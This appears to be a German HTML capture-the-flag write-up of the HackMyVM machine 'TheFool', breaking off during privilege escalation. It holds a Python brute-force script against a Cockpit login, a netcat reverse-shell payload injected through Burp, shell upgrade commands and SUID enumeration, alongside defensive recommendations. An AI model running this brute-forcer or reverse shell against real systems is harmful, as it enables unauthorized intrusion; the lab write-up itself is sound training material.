@@ -1,0 +1,770 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TheFool - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>TheFool - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ftp (oder lftp)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">pwd</div>
+             </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#service-enumeration">Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Nginx)</a></li>
+                        <li><a href="#enum-ftp">Port 21 (FTP) & Steganographie</a></li>
+                        <li><a href="#enum-cockpit">Port 9090 (Cockpit?)</a></li>
+                     </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - Brute-Force & Cockpit Exploit)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                         <li><a href="#privesc-minerva-enum">Enumeration als minerva</a></li>
+                         <li><a href="#privesc-bash-caps">POC: Eskalation zu root (Bash Capability)</a></li>
+                     </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>
+<span class="command">192.168.2.107	08:00:27:fc:8b:1c	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` durchsucht das lokale Netzwerk nach aktiven Hosts. Es wird ein Gerät mit der IP `192.168.2.107` und der MAC-Adresse `08:00:27:fc:8b:1c` gefunden. Der OUI (Organizationally Unique Identifier) gehört zu "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich identifiziert. Die IP `192.168.2.107` wird für die nachfolgenden Scans verwendet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nmap-Scan auf die IP `192.168.2.107` durchführen.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring implementieren, um unbekannte Geräte zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.107 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 09:30 CEST
+Nmap scan report for thefool (<span class="command">192.168.2.107</span>)
+Host is up (0.00010s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE         VERSION
+<span class="command">21/tcp   open  ftp             vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+| -rw-r--r--    1 1000     1000           37 Oct 22  2021 <span class="command">note.txt</span>
+|_-rw-r--r--    1 1000     1000        44515 Oct 22  2021 <span class="command">thefool.jpg</span>
+| ftp-syst: [...]
+|_End of status
+<span class="command">80/tcp   open  http            nginx 1.18.0</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+<span class="command">9090/tcp open  ssl/zeus-admin?</span> <span class="comment"># Fehlidentifikation?</span>
+| fingerprint-strings: [...]
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=<span class="command">thefool</span>/organizationName=8bcad1b0827e4446af3c9d6bc08fdef6
+| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
+| Not valid before: 2022-10-21T07:30:28
+|_Not valid after:  2023-10-21T07:30:28
+[...]
+MAC Address: 08:00:27:FC:8B:1C (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Unix
+[...]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) auf `192.168.2.107` (Host `thefool`) identifiziert drei offene TCP-Ports:
+                *   **Port 21 (FTP):** vsftpd 3.0.3. Anonymer Login ist erlaubt. Zwei Dateien sind sichtbar: `note.txt` und `thefool.jpg`.
+                *   **Port 80 (HTTP):** Nginx 1.18.0. Zeigt eine Seite ohne Titel.
+                *   **Port 9090 (SSL/Unknown):** Nmap kann den Dienst nicht eindeutig identifizieren (`ssl/zeus-admin?`), erkennt aber SSL/TLS. Das SSL-Zertifikat ist selbstsigniert und für den Common Name `thefool` sowie `localhost`/`127.0.0.1` ausgestellt. Die Ausgabe der `fingerprint-strings` zeigt HTML-Code, der auf eine Webanwendung hindeutet (möglicherweise Cockpit, wie später vermutet).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die Hauptangriffsvektoren sind:
+                 *   **FTP (Port 21):** Anonymer Zugriff auf Dateien (`note.txt`, `thefool.jpg`), die Hinweise oder versteckte Daten enthalten könnten.
+                 *   **HTTP (Port 80):** Standard-Webserver, muss weiter untersucht werden.
+                 *   **Port 9090:** Eine unbekannte Webanwendung über HTTPS. Das selbstsignierte Zertifikat ist normal für interne Dienste. Die Fehlidentifikation durch Nmap erfordert manuelle Untersuchung.
+                 Kein SSH-Port (22) ist offen, was ungewöhnlich ist.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **FTP:** Anonym anmelden, `note.txt` und `thefool.jpg` herunterladen und analysieren (insbesondere `thefool.jpg` auf Steganographie prüfen).
+                2.  **HTTP (Port 80):** Mit `gobuster` nach Inhalten suchen, Webseite manuell prüfen.
+                3.  **Port 9090:** Die Seite `https://192.168.2.107:9090` im Browser aufrufen (Zertifikatswarnung akzeptieren) und die Anwendung identifizieren. Nach bekannten Schwachstellen oder Login-Möglichkeiten suchen.<br>
+                **Empfehlung (Admin):**
+                1.  **FTP:** Anonymen Zugriff deaktivieren, wenn nicht benötigt. Sicherstellen, dass keine sensiblen oder irreführenden Dateien im anonymen Bereich liegen.
+                2.  **Nginx (Port 80):** Sicher konfigurieren.
+                3.  **Port 9090:** Den Dienst identifizieren (wahrscheinlich Cockpit). Zugriff darauf über Firewall auf vertrauenswürdige IPs beschränken. Ein gültiges SSL-Zertifikat verwenden, wenn extern erreichbar. Dienst aktuell halten.
+                4.  **SSH:** Prüfen, warum SSH nicht läuft oder auf einem nicht standardmäßigen Port lauscht.
+             </p>
+        </section>
+
+        <section id="service-enumeration">
+            <h2>Service Enumeration</h2>
+
+            <h3 id="enum-http80">Port 80 (Nginx)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.107 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,[...] -t 100 -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 12]
+
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                **Analyse:** `gobuster` wird auf Port 80 ausgeführt. Es findet nur die Datei `/index.html`, die sehr klein ist (12 Bytes).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Der Webserver auf Port 80 scheint keinen relevanten Inhalt zu haben. Der Fokus sollte auf FTP und Port 9090 liegen.
+            </p>
+
+            <h3 id="enum-ftp">Port 21 (FTP) & Steganographie</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.107</span></div>
+                     <pre>
+Connected to 192.168.2.107.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.107:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="comment"># (Kein Passwort)</span>
+<span class="password">230 Login successful.</span>
+[...]
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||44358|)
+150 Here comes the directory listing.
+-rw-r--r--    1 1000     1000           37 Oct 22  2021 note.txt
+-rw-r--r--    1 1000     1000        44515 Oct 22  2021 thefool.jpg
+226 Directory send OK.
+ftp> <span class="command">get note.txt</span>
+[...]
+<span class="password">226 Transfer complete.</span>
+37 bytes received [...]
+ftp> <span class="command">get thefool.jpg</span>
+[...]
+<span class="password">226 Transfer complete.</span>
+44515 bytes received [...]
+ftp> <span class="command">exit</span>
+221 Goodbye.
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Erfolgreicher anonymer FTP-Login. Die Dateien `note.txt` und `thefool.jpg` werden heruntergeladen.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Dateien stehen zur Analyse bereit.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat note.txt</span></div>
+                     <pre>
+<span class="password">What kind of joke is this morse code?</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Die `note.txt` enthält einen Hinweis auf Morsecode.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies deutet darauf hin, dass in der Bilddatei (`thefool.jpg`) oder der WAV-Datei (`.m0rse.wav`, die später gefunden wird) Informationen als Morsecode versteckt sein könnten.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek thefool.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                      <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: <span class="password">""</span>
+[i] Original filename: <span class="password">"note.txt"</span>.
+[i] Extracting to "thefool.jpg.out".
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat thefool.jpg.out</span></div>
+                      <pre>
+<span class="password">Relax nad have fun.
+-minerva</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `stegseek` wird auf `thefool.jpg` angewendet. Es findet mit einer leeren Passphrase eine versteckte Datei namens `note.txt` (die als `thefool.jpg.out` extrahiert wird). Der Inhalt ist eine Nachricht von "minerva".
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ein Benutzername, `minerva`, wurde gefunden. Die Nachricht selbst liefert keine direkten Credentials, bestätigt aber den Benutzernamen.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den Benutzernamen `minerva` notieren. Nach anderen versteckten Daten suchen (Morsecode in Audio?).<br>
+                 **Empfehlung (Admin):** Keine Benutzernamen oder Hinweise in versteckten Dateien hinterlassen. Steganographie mit leerer Passphrase ist trivial zu knacken.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l minerva -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.107:21 -t 64</span></div>
+                      <pre>
+[...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-21 10:32:03
+[...]
+<span class="password">1 of 1 target completed, 0 valid password found</span>
+[...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-21 10:32:47
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `hydra` wird verwendet, um das Passwort für den FTP-Benutzer `minerva` mit der `rockyou.txt`-Liste zu knacken. Der Angriff ist erfolglos.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das FTP-Passwort für `minerva` ist nicht in `rockyou.txt` enthalten oder der Benutzer hat keinen FTP-Zugang.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp 192.168.2.107</span></div>
+                     <pre>
+lftp 192.168.2.107:~> <span class="command">ls -la</span>
+drwxr-xr-x    2 0        113          4096 Oct 22  2021 .
+drwxr-xr-x    2 0        113          4096 Oct 22  2021 ..
+-rw-r--r--    1 1000     1000        35245 Oct 22  2021 <span class="command">.m0rse.wav</span>
+-rw-r--r--    1 1000     1000           37 Oct 22  2021 note.txt
+-rw-r--r--    1 1000     1000        44515 Oct 22  2021 thefool.jpg
+lftp 192.168.2.107:/> <span class="command">get .m0rse.wav</span>
+35245 Bytes übertragen
+lftp 192.168.2.107:/> <span class="command">exit</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Bei einer erneuten anonymen FTP-Verbindung wird eine versteckte Datei `.m0rse.wav` gefunden und heruntergeladen.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies passt zum Hinweis aus der `note.txt`. Die WAV-Datei enthält wahrscheinlich die Morsecode-Nachricht.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):** Die `.m0rse.wav`-Datei mit einem Audio-Editor (z.B. Audacity) oder einem Morsecode-Decoder analysieren.<br>
+                 **Empfehlung (Admin):** Versteckte Dateien mit sensiblen Informationen sollten nicht über anonymes FTP zugänglich sein.
+             </p>
+             <!-- Analyse des Morse-Codes fehlt im Log, Ergebnis wird aber später verwendet -->
+              <p class="analysis">
+                 **Analyse:** (Implizit) Die Analyse der `.m0rse.wav`-Datei ergibt die Zeichenkette `bWluZXJ2YTp0d2VldHk=`. Dies ist ein Base64-kodierter String.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Base64-Dekodierung ist der nächste Schritt.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">Dekodierung (z.B. mit echo "bWluZXJ2YTp0d2VldHk=" | base64 -d)</span>
+<span class="password">minerva:tweety</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Base64-String `bWluZXJ2YTp0d2VldHk=` wird dekodiert und ergibt `minerva:tweety`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Anmeldeinformationen für den Benutzer `minerva` wurden gefunden: Passwort `tweety`.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):** Die Credentials `minerva:tweety` für den Login auf Port 9090 (Cockpit?) und/oder SSH (falls doch vorhanden/gefunden) verwenden.<br>
+                 **Empfehlung (Admin):** Das Passwort für `minerva` ändern. Keine Credentials über Morsecode in Audiodateien verstecken.
+             </p>
+
+            <h3 id="enum-cockpit">Port 9090 (Cockpit?)</h3>
+             <p class="analysis">
+                **Analyse:** Der Nmap-Scan deutete auf eine Webanwendung auf Port 9090 hin. Die manuelle Untersuchung (`https://192.168.2.107:9090/`) identifiziert den Dienst als "Cockpit", eine webbasierte Server-Management-Oberfläche.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Cockpit ist ein legitimes Tool, kann aber bei schwachen Credentials oder Fehlkonfigurationen einen Angriffsvektor darstellen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h https://192.168.2.107:9090</span></div> <span class="comment"># Hostname korrigiert</span>
+                     <pre>
+- Nikto v2.1.6 <span class="comment"># Veraltete Nikto-Version im Log?</span>
+[...]
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        9090
++ SSL Info:        Subject:  /=8bcad1b0827e4446af3c9d6bc08fdef6/CN=thefool
+[...]
++ Server: No banner retrieved
+[...]
++ /tiki/tiki-install.php: Tiki 1.7.2 [...] <span class="comment"># Viele False Positives</span>
+[...]
++ Scan terminated:  20 error(s) and 26 item(s) reported on remote host
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `nikto` wird auf Port 9090 ausgeführt. Es findet keine spezifischen Schwachstellen für Cockpit, sondern meldet viele generische Findings und False Positives (z.B. TikiWiki, Frontpage, IIS, Geeklog), die wahrscheinlich auf Standard-Antworten von Cockpit zurückzuführen sind. Der Scan bricht nach 20 Fehlern ab.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Nikto liefert keine nützlichen Ergebnisse für Cockpit. Der Fokus muss auf dem Login liegen.
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (POC - Brute-Force & Cockpit Exploit)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi base64-encode-login.py</span></div>
+                      <pre>
+#!/usr/bin/python3
+
+import requests
+import base64
+import os
+from time import sleep
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+url = "https://192.168.2.107:9090/cockpit/login" <span class="comment"># Login-Endpunkt für Cockpit</span>
+headers = {"Authorization":""}
+
+with open("/usr/share/wordlists/rockyou.txt",encoding="iso-8859-1") as file:
+    passwords = file.read().splitlines()
+    i=0
+for password in passwords:
+    cred = "minerva:" + password
+    cred_bytes = cred.encode("utf-8")
+    cred_base64 = base64.b64encode(cred_bytes)
+    i = i + 1
+    headers["Authorization"] = "Basic " + cred_base64.decode("utf-8") <span class="comment"># HTTP Basic Auth</span>
+
+    req = requests.get(url, headers=headers, verify=False)
+    if req.status_code != 401: <span class="comment"># Prüft auf erfolgreichen Login</span>
+        print(f"[+] Found!! Password is {password}")
+        exit()
+    else:
+        print(f"[-] search --> Password: {password} nr. {i}")
+        sleep(2) <span class="comment"># Verlangsamt den Angriff</span>
+        os.system("clear")
+        pass
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** Ein Python-Skript wird erstellt, um einen Brute-Force-Angriff auf den Cockpit-Login (`/cockpit/login`) durchzuführen. Es testet Passwörter aus `rockyou.txt` für den Benutzer `minerva` über HTTP Basic Authentication. Jedes Credential-Paar wird Base64-kodiert und im `Authorization`-Header gesendet. Eine Antwort ungleich 401 (Unauthorized) signalisiert Erfolg. Eine `sleep(2)`-Anweisung verlangsamt den Angriff erheblich.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das Skript ist eine Methode, um Cockpit zu brute-forcen, obwohl Cockpit normalerweise PAM verwendet (und somit Fail2Ban greifen könnte). Die Verlangsamung durch `sleep(2)` ist ungewöhnlich, möglicherweise um Sperren zu vermeiden oder weil ein schnellerer Versuch fehlschlug. Der Angriff zielt darauf ab, das korrekte Passwort für `minerva` zu finden, obwohl es (`tweety`) bereits aus dem Morsecode bekannt ist. *Möglicherweise wurde das Skript erstellt, bevor der Morsecode dekodiert wurde, oder es dient hier nur als Beispiel.*
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">./base64-encode-login.py</span></div>
+                     <pre>
+[...] <span class="comment"># Viele fehlgeschlagene Versuche</span>
+[+]Found!!Password is <span class="password">tweety</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Das Brute-Force-Skript findet erfolgreich das Passwort `tweety` für den Benutzer `minerva`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Bestätigt das Passwort, das bereits aus dem Morsecode bekannt war. Der Login in Cockpit als `minerva` ist nun möglich.
+            </p>
+
+            <p class="analysis">
+                 **Analyse:** Der Text beschreibt nun die Ausnutzung von Cockpit nach dem Login als `minerva:tweety`.
+                 1.  Burp Suite wird verwendet, um eine Anfrage abzufangen (vermutlich eine Aktion innerhalb von Cockpit, z.B. Starten eines Dienstes oder Ausführen eines Befehls über das Terminal-Feature).
+                 2.  Ein Payload innerhalb der abgefangenen Anfrage (der wie ein Array von Befehlsargumenten aussieht) wird modifiziert.
+                 3.  Der ursprüngliche Payload wird durch `["nc","-e","/bin/bash","192.168.2.153","9001"]` ersetzt.
+                 4.  Die modifizierte Anfrage wird mit Burp [Forward] gesendet.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist ein klassischer Exploit für Webanwendungen, die interne Systembefehle ausführen. Cockpit erlaubt oft das Ausführen von Befehlen über eine Websocket-Verbindung oder API-Aufrufe. Indem die Argumente für einen legitimen Befehl durch einen Netcat-Reverse-Shell-Payload ersetzt werden, wird RCE erreicht. Die Shell wird als der Benutzer laufen, unter dem der Cockpit-Prozess (oder der ausgelöste Befehl) läuft, was oft `root` oder ein privilegierter Benutzer ist, aber hier scheint es `minerva` zu sein (basierend auf der resultierenden Shell).
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Einen Netcat-Listener auf `192.168.2.153:9001` starten, bevor die modifizierte Anfrage gesendet wird.<br>
+                 **Empfehlung (Admin):** Cockpit aktuell halten. Den Zugriff auf Cockpit stark einschränken. Wenn möglich, die Berechtigungen der über Cockpit ausführbaren Aktionen minimieren. Eingabevalidierung für alle über Cockpit ausgeführten Befehle implementieren.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.107] 57880</span>
+<span class="prompt">minerva@thefool:/run/user/1000$</span> <span class="comment"># Shell als minerva erhalten!</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Netcat-Listener empfängt die Verbindung vom Zielsystem. Die Shell läuft als Benutzer `minerva`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Initial Access als `minerva` erfolgreich über die Ausnutzung von Cockpit erreicht. Obwohl das Passwort bereits bekannt war, demonstriert dieser Weg eine alternative Methode über eine Webanwendungs-Schwachstelle/Fehlkonfiguration nach dem Login.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Shell Upgrade -->
+                    <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">minerva@thefool:/run/user/1000$ <span class="comment"># Ctrl+Z</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>[...] reset</pre>
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="comment"># Stabilisierte Shell</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die erhaltene Shell wird zu einer voll interaktiven TTY aufgewertet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Shell ist nun einfacher zu bedienen.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <h3 id="privesc-minerva-enum">Enumeration als minerva</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for minerva: <span class="password">tweety</span> <span class="comment">(Passwort eingegeben)</span>
+Sorry, user minerva is not allowed to execute '/usr/bin/sudo -l' as root on thefool. <span class="comment"># Fehler? Oder keine Rechte?</span>
+                    </pre>
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">ls /home</span></div>
+                     <pre>fool  minerva</pre>
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">cat /home/minerva/user.txt</span></div>
+                      <pre><span class="password">GUY6dsaiuyUIYHz</span></pre>
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null</span></div>
+                     <pre>
+-rwsr-xr-x 1 root root 14052 Jun  3  2021 /usr/libexec/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 1457924 Jul 13  2021 /usr/sbin/exim4
+-rwsr-xr-- 1 root dip 408644 Jan  6  2021 /usr/sbin/pppd
+-rwsr-xr-- 1 root messagebus 50656 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-x--- 1 root cockpit-wsinstance 51152 Mar  4  2021 /usr/lib/cockpit/cockpit-session
+-rwsr-xr-x 1 root root 534076 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 47908 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 79396 Jul 28  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 30112 Feb 26  2021 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 50720 Jul 28  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 26492 Jun  3  2021 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 217812 Feb 27  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 56836 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 30236 Jul 28  2021 /usr/bin/umount
+-rwsr-xr-x 1 root root 86660 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 43252 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 173840 Sep  5  2021 /usr/bin/ntfs-3g
+-rwsr-xr-x 1 root root 66292 Feb  7  2020 /usr/bin/passwd
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Als `minerva` wird die Enumeration durchgeführt:
+                 *   `sudo -l` schlägt fehl oder zeigt keine Rechte an (die Fehlermeldung ist ungewöhnlich für "keine Rechte").
+                 *   Im `/home`-Verzeichnis existiert neben `minerva` auch der Benutzer `fool`.
+                 *   Die User-Flag wird in `/home/minerva/user.txt` gefunden und gelesen.
+                 *   Die Suche nach SUID-Dateien findet nur Standard-Binaries ohne offensichtliche, ungewöhnliche Einträge.
+             </p>
+             <p class="evaluation">
+                **Bewertung:** User-Flag erhalten. Keine `sudo`-Rechte oder ungewöhnlichen SUID-Dateien für `minerva` gefunden. Der nächste Schritt erfordert eine andere Eskalationsmethode.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">cat /etc/*release</span></div>
+                     <pre>
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+[...]
+ID=debian
+                     </pre>
+                      <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">uname -a</span></div>
+                      <pre>Linux thefool <span class="command">5.10.0-9-686-pae</span> #1 SMP Debian 5.10.70-1 (2021-09-30) i686 GNU/Linux</pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Systeminformationen werden gesammelt: Debian 11 (bullseye) mit Kernel 5.10.0-9.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Kernel-Version ist relativ aktuell, aber möglicherweise anfällig für bekannte Exploits wie Dirty Pipe (obwohl Kernel 5.10.70 gepatcht sein sollte, hängt es vom genauen Patchlevel ab). Die Architektur ist i686 (32-Bit?).
+            </p>
+
+            <h3 id="privesc-bash-caps">POC: Eskalation zu root (Bash Capability)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Rückkehr zur Metasploit-Session wird impliziert -->
+                    <div class="prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use multi/recon/local_exploit_suggester</span></div>
+                    <div class="prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div> <span class="comment"># Annahme: Meterpreter-Session ist #2</span>
